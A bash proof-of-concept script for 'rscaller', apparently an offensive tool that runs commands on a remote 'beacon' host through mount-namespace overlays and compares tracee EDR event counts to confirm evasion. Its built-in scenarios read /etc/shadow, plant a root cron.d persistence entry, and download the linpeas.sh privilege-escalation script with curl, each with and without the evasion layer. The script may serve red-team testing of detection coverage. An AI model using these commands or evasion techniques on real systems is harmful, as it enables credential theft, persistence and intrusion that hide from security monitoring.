#!/usr/bin/env bash
# poc.sh — manual PoC CLI for rscaller mount namespace overlay profiles.
#
# Starts rsbeacon (and optionally tracee) on BEACON_VM, then runs a single
# command via `rsc exec` with the chosen mount profile on REMOTE.  Prints
# tracee events after the command exits so you can verify execution locality.
#
# Add --compare (or just --baseline-cmd) to also run a command directly on
# BEACON_VM (no rscaller involved) under its own tracee capture, so you get
# an apples-to-apples "with evasion" vs "without evasion" event count.
#
# Usage:
#   bash scripts/poc.sh [OPTIONS]
#
# Options:
#   --profile  <name>   Mount profile: none|recon|relay|shadow|ghost  (default: recon)
#   --cmd      <cmd>    Command to run inside rsc exec (evasion side)    (default: see profile)
#   --no-tracee         Skip tracee monitoring (faster startup)
#   --beacon   <host>   Beacon VM SSH alias                             (default: dev-vm-2)
#   --client   <host>   Client VM SSH alias                             (default: dev-vm-1)
#   --port     <port>   rsbeacon port                                   (default: 9999)
#   --dir      <path>   Remote rscaller dir                             (default: /home/ubuntu/rscaller)
#   --netstack <name>   rsbeacon --netstack: direct|smoltcp-xdp          (default: direct)
#   --xdp-iface <name>  rsbeacon --xdp-iface (required if --netstack smoltcp-xdp)
#   --xdp-queue <n>     rsbeacon --xdp-queue                             (default: 0)
#   --events   <list>   Comma-separated tracee --events to capture       (default: execve,execveat)
#   --query    <list>   Comma-separated substrings; only events whose
#                       processName/eventName/args match ANY of them are
#                       counted/shown                                    (default: none = show all)
#   --baseline-cmd <cmd> Command run directly (no rscaller) on BEACON_VM
#                       under its own tracee capture, for comparison
#   --compare           Shorthand: enable comparison; baseline defaults to
#                       --cmd verbatim if --baseline-cmd wasn't given
#   --cleanup-cmd <cmd> Best-effort cmd run on BEACON_VM and REMOTE after
#                       the test (e.g. remove a planted file)
#   --scenario <name>   Preset bundle of profile/cmd/baseline-cmd/events/
#                       query/cleanup-cmd: exec|file|network (see below).
#                       Any flag you also pass explicitly overrides the
#                       preset's value for that field.
#   -h, --help
#
# Profiles:
#   none   — no overlay, no forwarding; ip addr shows CLIENT addresses
#   recon  — /proc + /sys overlaid; grep /proc/net/fib_trie shows beacon IP
#   relay  — network syscalls forwarded through beacon; no filesystem overlay
#   shadow — full identity overlay (/proc + /sys + /etc) + network forwarding
#   ghost  — shadow + writable /mnt/target + process signal forwarding
#
# Scenarios (--scenario NAME), each is a --compare run:
#   exec     — cat /etc/shadow via ghost's /mnt/target FUSE anchor vs. cat
#              /etc/shadow directly on the beacon. Watches execve/execveat.
#   file     — plant a cron.d entry via ghost's /mnt/target vs. planting the
#              same entry directly on the beacon. Watches execve/execveat +
#              security_file_open,magic_write, queries for "cron".
#   network  — curl-download linpeas.sh via the relay profile (network
#              syscalls forwarded, file lands on the CLIENT) vs. curling it
#              directly on the beacon. Watches execve/execveat +
#              security_socket_connect,net_packet_tcp,net_packet_udp,net_packet_dns.
#
# Examples:
#   bash scripts/poc.sh --profile recon
#   bash scripts/poc.sh --profile shadow --cmd hostname
#   bash scripts/poc.sh --profile none --no-tracee --cmd "ip -4 addr"
#   bash scripts/poc.sh --scenario exec
#   bash scripts/poc.sh --scenario file
#   bash scripts/poc.sh --scenario network
#   bash scripts/poc.sh --profile ghost --compare --query shadow \
#       --cmd "cat /mnt/target/etc/shadow" --baseline-cmd "cat /etc/shadow"

set -euo pipefail

BEACON_VM="${BEACON_VM:-dev-vm-2}"
REMOTE="${REMOTE:-dev-vm-1}"
BEACON_PORT="${BEACON_PORT:-9999}"
REMOTE_DIR="${REMOTE_DIR:-/home/ubuntu/rscaller}"
BEACON_BIN="${BEACON_BIN:-/home/ubuntu/rsbeacon}"
TRACEE_IMAGE="${TRACEE_IMAGE:-aquasec/tracee:latest}"
BECOME_PASS="${BECOME_PASS:-}"
MOUNT_BASE="/tmp/rsc-profiles"

PROFILE="recon"
CMD=""
NO_TRACEE=0
NETSTACK="${NETSTACK:-direct}"
XDP_IFACE="${XDP_IFACE:-}"
XDP_QUEUE="${XDP_QUEUE:-0}"
TRACEE_EVENTS="execve,execveat"
QUERY=""
BASELINE_CMD=""
COMPARE=0
CLEANUP_CMD=""
SCENARIO=""

# Track which fields the caller passed explicitly, so --scenario presets
# never clobber an explicit flag.
PROFILE_SET=0
CMD_SET=0
EVENTS_SET=0
QUERY_SET=0
BASELINE_CMD_SET=0
CLEANUP_CMD_SET=0

bold=$'\e[1m'
dim=$'\e[2m'
green=$'\e[32m'
yellow=$'\e[33m'
red=$'\e[31m'
reset=$'\e[0m'

usage() {
	sed -n '/^# Usage:/,/^[^#]/{ /^#/{ s/^# \?//; p } }' "$0"
	exit 0
}

die() {
	echo "${red}error:${reset} $*" >&2
	exit 1
}
say() { echo "${bold}==>${reset} $*"; }
info() { echo "    $*"; }

# ── Arg parse ────────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
	case "$1" in
	--profile)
		PROFILE="$2"
		PROFILE_SET=1
		shift 2
		;;
	--cmd)
		CMD="$2"
		CMD_SET=1
		shift 2
		;;
	--no-tracee)
		NO_TRACEE=1
		shift
		;;
	--beacon)
		BEACON_VM="$2"
		shift 2
		;;
	--client)
		REMOTE="$2"
		shift 2
		;;
	--port)
		BEACON_PORT="$2"
		shift 2
		;;
	--dir)
		REMOTE_DIR="$2"
		shift 2
		;;
	--netstack)
		NETSTACK="$2"
		shift 2
		;;
	--xdp-iface)
		XDP_IFACE="$2"
		shift 2
		;;
	--xdp-queue)
		XDP_QUEUE="$2"
		shift 2
		;;
	--events)
		TRACEE_EVENTS="$2"
		EVENTS_SET=1
		shift 2
		;;
	--query)
		QUERY="$2"
		QUERY_SET=1
		shift 2
		;;
	--baseline-cmd)
		BASELINE_CMD="$2"
		BASELINE_CMD_SET=1
		COMPARE=1
		shift 2
		;;
	--compare)
		COMPARE=1
		shift
		;;
	--cleanup-cmd)
		CLEANUP_CMD="$2"
		CLEANUP_CMD_SET=1
		shift 2
		;;
	--scenario)
		SCENARIO="$2"
		shift 2
		;;
	-h | --help) usage ;;
	*) die "Unknown option: $1" ;;
	esac
done

# ── Scenario presets (only fill fields not explicitly overridden) ───────────
if [[ -n "$SCENARIO" ]]; then
	case "$SCENARIO" in
	exec)
		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="ghost"
		[[ "$CMD_SET" -eq 1 ]] || CMD="cat /mnt/target/etc/shadow"
		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="sudo cat /etc/shadow"
		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="execve,execveat"
		[[ "$QUERY_SET" -eq 1 ]] || QUERY="cat"
		COMPARE=1
		;;
	file)
		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="ghost"
		# rsc execs argv directly (no shell) — anything using '>' or quoting
		# needs its own sh -c wrapper, which then runs *inside* the child's
		# mount namespace so /mnt/target is visible when the redirect opens.
		[[ "$CMD_SET" -eq 1 ]] || CMD="sh -c 'echo \"* * * * * root /tmp/.rscaller-poc\" > /mnt/target/etc/cron.d/rscaller-poc'"
		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD='sudo sh -c "echo \"* * * * * root /tmp/.rscaller-poc\" > /etc/cron.d/rscaller-poc"'
		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="execve,execveat,security_file_open,magic_write"
		[[ "$QUERY_SET" -eq 1 ]] || QUERY="cron"
		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="sudo rm -f /etc/cron.d/rscaller-poc"
		COMPARE=1
		;;
	network)
		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="relay"
		LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
		[[ "$CMD_SET" -eq 1 ]] || CMD="curl -fsSL '$LINPEAS_URL' -o /tmp/linpeas.sh"
		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="curl -fsSL '$LINPEAS_URL' -o /tmp/linpeas.sh"
		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="execve,execveat,security_socket_connect,net_packet_tcp,net_packet_udp,net_packet_dns"
		[[ "$QUERY_SET" -eq 1 ]] || QUERY="curl,github,linpeas"
		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="rm -f /tmp/linpeas.sh"
		COMPARE=1
		;;
	*)
		die "Unknown --scenario '$SCENARIO'. Valid: exec file network"
		;;
	esac
fi

# --compare with no explicit baseline: default to running --cmd verbatim.
if [[ "$COMPARE" -eq 1 && -z "$BASELINE_CMD" ]]; then
	BASELINE_CMD="$CMD"
fi

# Default command per profile (only when neither --cmd nor --scenario set one)
if [[ -z "$CMD" ]]; then
	case "$PROFILE" in
	none)
		CMD="ip -4 addr"
		;;
	recon)
		BEACON_IP=$(ssh "$BEACON_VM" "hostname -I | awk '{print \$1}'" 2>/dev/null || echo "")
		CMD="grep ${BEACON_IP:-192.168.122.180} /proc/net/fib_trie"
		;;
	relay)
		CMD="curl -s ifconfig.me"
		;;
	shadow | ghost)
		CMD="hostname"
		;;
	*)
		CMD="hostname"
		;;
	esac
fi

RSC="$REMOTE_DIR/target/release/rsc"
RSCLIENT="$REMOTE_DIR/target/release/rsclient"
NAME="prof-$PROFILE"
MOUNT_POINT="$MOUNT_BASE/$NAME"

# ── Validate profile ─────────────────────────────────────────────────────────
case "$PROFILE" in
none | recon | relay | shadow | ghost) ;;
*) die "Unknown profile '$PROFILE'. Valid: none recon relay shadow ghost" ;;
esac

# ── Validate netstack ────────────────────────────────────────────────────────
case "$NETSTACK" in
direct) ;;
smoltcp-xdp)
	[[ -n "$XDP_IFACE" ]] || die "--netstack smoltcp-xdp requires --xdp-iface <interface>"
	;;
*) die "Unknown --netstack '$NETSTACK'. Valid: direct smoltcp-xdp" ;;
esac
NETSTACK_ARGS="--netstack $NETSTACK"
[[ "$NETSTACK" == "smoltcp-xdp" ]] && NETSTACK_ARGS="$NETSTACK_ARGS --xdp-iface $XDP_IFACE --xdp-queue $XDP_QUEUE"

# ── Print plan ───────────────────────────────────────────────────────────────
echo ""
echo "${bold}rscaller PoC — mount namespace overlay${reset}"
echo "  client:   ${green}${REMOTE}${reset}"
echo "  beacon:   ${green}${BEACON_VM}:${BEACON_PORT}${reset}"
echo "  netstack: ${yellow}${NETSTACK}${reset}$([ "$NETSTACK" == "smoltcp-xdp" ] && echo " (iface=$XDP_IFACE queue=$XDP_QUEUE)")"
echo "  profile:  ${yellow}${PROFILE}${reset}"
echo "  command:  ${dim}${CMD}${reset}"
echo "  tracee:   $([ "$NO_TRACEE" -eq 1 ] && echo "disabled" || echo "enabled (events=${TRACEE_EVENTS})")"
[[ -n "$QUERY" ]] && echo "  query:    ${dim}${QUERY}${reset}"
if [[ "$COMPARE" -eq 1 ]]; then
	echo "  compare:  ${dim}baseline-cmd=${BASELINE_CMD}${reset}"
fi
echo ""

# ── Tracee helpers (reused for baseline + evasion capture windows) ─────────
# start_tracee: launches tracee in a privileged container on BEACON_VM,
# sets TRACEE_PID / TRACEE_LOG / TRACEE_CONTAINER.
start_tracee() {
	TRACEE_LOG="/tmp/tracee-poc-$$-$RANDOM.log"
	TRACEE_CONTAINER="tracee-poc-$$-$RANDOM"

	if ! ssh "$BEACON_VM" "command -v docker >/dev/null 2>&1" 2>/dev/null; then
		die "docker not found on $BEACON_VM. Install docker or pass --no-tracee."
	fi

	say "starting tracee container on $BEACON_VM (image: $TRACEE_IMAGE)"
	ssh "$BEACON_VM" "
        nohup sudo docker run --rm --name '$TRACEE_CONTAINER' \
            --privileged --pid=host \
            -v /lib/modules:/lib/modules:ro \
            -v /usr/src:/usr/src:ro \
            -v /etc/os-release:/etc/os-release:ro \
            '$TRACEE_IMAGE' \
            --output format:json \
            --events '$TRACEE_EVENTS' \
            >'$TRACEE_LOG' 2>/dev/null &
        echo \$!
    " >/tmp/poc-tracee-pid-$$ 2>/dev/null || true
	TRACEE_PID=$(cat /tmp/poc-tracee-pid-$$ 2>/dev/null || echo "")
	rm -f /tmp/poc-tracee-pid-$$
	sleep 3
}

# stop_tracee_and_filter: kills tracee, prints matched events, sets
# LAST_EVENT_COUNT to how many survived the (optional) $QUERY filter.
stop_tracee_and_filter() {
	if [[ -n "${TRACEE_CONTAINER:-}" ]]; then
		ssh "$BEACON_VM" "sudo docker kill '$TRACEE_CONTAINER' 2>/dev/null || true" 2>/dev/null
	elif [[ -n "${TRACEE_PID:-}" ]]; then
		ssh "$BEACON_VM" "sudo kill $TRACEE_PID 2>/dev/null || true" 2>/dev/null
	fi
	local out
	out=$(ssh "$BEACON_VM" "cat $TRACEE_LOG 2>/dev/null" |
		python3 -c "
import sys, json
motd = {'50-landscape-sy','50-motd-news','85-fwupd','90-updates-avai',
        'update-motd-fsc','update-motd-upd','landscape-sysinfo'}
query = [q.strip().lower() for q in '$QUERY'.split(',') if q.strip()]
found = 0
for line in sys.stdin:
    line = line.strip()
    if not line:
        continue
    try:
        e = json.loads(line)
    except Exception:
        continue
    if e.get('processName','') in motd:
        continue
    haystack = json.dumps(e).lower()
    if query and not any(q in haystack for q in query):
        continue
    evt = e.get('eventName', e.get('syscall','?'))
    proc = e.get('processName','?')
    pid = e.get('processId','?')
    ts  = e.get('timestamp','')
    print(f'  [{ts}] {evt} pid={pid} proc={proc}')
    found += 1
print(f'COUNT={found}')
" 2>/dev/null || echo "COUNT=0")
	LAST_EVENT_COUNT=$(echo "$out" | grep -o 'COUNT=[0-9]*' | tail -1 | cut -d= -f2)
	LAST_EVENT_COUNT="${LAST_EVENT_COUNT:-0}"
	echo "$out" | grep -v '^COUNT='
	if [[ "$LAST_EVENT_COUNT" -eq 0 ]]; then
		echo "  (none matched)"
	fi
}

# run_remote <host> <cmd>: ssh to host and run cmd. If BECOME_PASS is set,
# pipe it to sudo -S so sudo-based commands run non-interactively.
run_remote() {
	local host="$1" cmd="$2"
	if [[ -n "$BECOME_PASS" ]]; then
		printf '%s\n' "$BECOME_PASS" | ssh "$host" "sudo -S -k $cmd"
	else
		ssh "$host" "$cmd"
	fi
}

# ── Step 1: Start rsbeacon ───────────────────────────────────────────────────
say "Starting rsbeacon on $BEACON_VM"
ssh "$BEACON_VM" "sudo pkill rsbeacon 2>/dev/null || true; sleep 0.3; \
    nohup sudo env RUST_LOG=${RUST_LOG:-rsbeacon=debug} $BEACON_BIN --listen 0.0.0.0:$BEACON_PORT $NETSTACK_ARGS >/tmp/rsbeacon-poc.log 2>&1 &"
sleep 1
if ! ssh "$BEACON_VM" "ss -tlnp | grep -q ':$BEACON_PORT'" 2>/dev/null; then
	echo "${red}rsbeacon failed to start. Log:${reset}"
	ssh "$BEACON_VM" "cat /tmp/rsbeacon-poc.log" 2>/dev/null || true
	die "rsbeacon not listening on :$BEACON_PORT"
fi
info "rsbeacon listening on :$BEACON_PORT"

# ── Step 1b: Baseline run (no rscaller) — only with --compare ───────────────
BASELINE_COUNT=""
if [[ "$COMPARE" -eq 1 && "$NO_TRACEE" -eq 0 ]]; then
	say "Baseline: running directly on $BEACON_VM (no rscaller)"
	info "command: $BASELINE_CMD"
	start_tracee
	set +e
	run_remote "$BEACON_VM" "$BASELINE_CMD"
	set -e
	echo ""
	say "Baseline tracee events (events=${TRACEE_EVENTS}${QUERY:+, query=$QUERY})"
	stop_tracee_and_filter
	BASELINE_COUNT="$LAST_EVENT_COUNT"
	echo ""
elif [[ "$COMPARE" -eq 1 ]]; then
	info "--no-tracee set — skipping baseline capture (nothing to compare)"
fi

# ── Step 2: Start tracee for the evasion run (optional) ────────────────────
TRACEE_PID=""
if [[ "$NO_TRACEE" -eq 0 ]]; then
	say "Starting tracee on $BEACON_VM for evasion run (settle 3s)"
	start_tracee
	info "tracee running (pid ${TRACEE_PID:-unknown}) → $TRACEE_LOG"
fi

# ── Step 3: Clean up stale mounts ───────────────────────────────────────────
BEACON_IP_SSH=$(ssh "$BEACON_VM" "hostname -I | awk '{print \$1}'" 2>/dev/null)

say "Cleaning stale mounts on $REMOTE"
ssh "$REMOTE" "mkdir -p '$MOUNT_BASE'; \
    sudo pkill -9 -f '$NAME' 2>/dev/null || true; sleep 0.4; \
    grep -qF '$MOUNT_POINT' /proc/mounts && sudo umount -l '$MOUNT_POINT' 2>/dev/null || true; \
    sudo rm -rf '$MOUNT_POINT' 2>/dev/null || true"

# ── Step 4: Run command via rsc exec ────────────────────────────────────────
say "Running: sudo rsc exec --mount-profile $PROFILE -- $CMD"
echo ""
echo "─── stdout ──────────────────────────────────────────────────────────────"
set +e
ssh "$REMOTE" \
	"sudo $RSC exec \
        --beacon '${BEACON_IP_SSH}:${BEACON_PORT}' \
        --rsclient '$RSCLIENT' \
        --mount-base '$MOUNT_BASE' \
        --name '$NAME' \
        --mount-profile '$PROFILE' \
        -- $CMD"
EXIT_CODE=$?
set -e
echo "─────────────────────────────────────────────────────────────────────────"
echo ""
info "exit code: $EXIT_CODE"

# ── Step 5: Cleanup rscfuse ─────────────────────────────────────────────────
ssh "$REMOTE" \
	"sudo pkill -9 -f '$NAME' 2>/dev/null || true; sleep 0.4; \
     grep -qF '$MOUNT_POINT' /proc/mounts && sudo umount -l '$MOUNT_POINT' 2>/dev/null || true; \
     sudo rm -rf '$MOUNT_POINT' 2>/dev/null || true" 2>/dev/null

# ── Step 6: Print tracee events for the evasion run ─────────────────────────
EVASION_COUNT=""
if [[ "$NO_TRACEE" -eq 0 ]]; then
	say "Evasion tracee events from $BEACON_VM (events=${TRACEE_EVENTS}${QUERY:+, query=$QUERY})"
	echo ""
	stop_tracee_and_filter
	EVASION_COUNT="$LAST_EVENT_COUNT"
	echo ""
fi

# ── Step 7: Best-effort cleanup command (both hosts) ────────────────────────
if [[ -n "$CLEANUP_CMD" ]]; then
	say "Cleanup: $CLEANUP_CMD"
	run_remote "$BEACON_VM" "$CLEANUP_CMD" 2>/dev/null || true
	run_remote "$REMOTE" "$CLEANUP_CMD" 2>/dev/null || true
fi

# ── Summary ──────────────────────────────────────────────────────────────────
if [[ "$COMPARE" -eq 1 && -n "$BASELINE_COUNT" ]]; then
	say "Comparison (matching events on $BEACON_VM)"
	echo "  baseline (no evasion): ${yellow}${BASELINE_COUNT}${reset} event(s)"
	echo "  evasion  (via rscaller): ${yellow}${EVASION_COUNT}${reset} event(s)"
	echo ""
	if [[ "$BASELINE_COUNT" -eq 0 ]]; then
		echo "${yellow}WARN${reset} baseline saw 0 events — tracee hooks may be inactive; result is meaningless."
		exit 1
	elif [[ "$EVASION_COUNT" -eq 0 ]]; then
		echo "${green}PASS${reset} — evasion confirmed: 0 matching events on $BEACON_VM during rscaller run."
	else
		echo "${red}FAIL${reset} — evasion run still produced ${EVASION_COUNT} matching event(s) on $BEACON_VM."
		exit 1
	fi
else
	say "Done (exit=$EXIT_CODE)"
	if [[ "$EXIT_CODE" -eq 0 ]]; then
		echo "${green}PASS${reset}"
	else
		echo "${red}FAIL${reset}"
		exit 1
	fi
fi
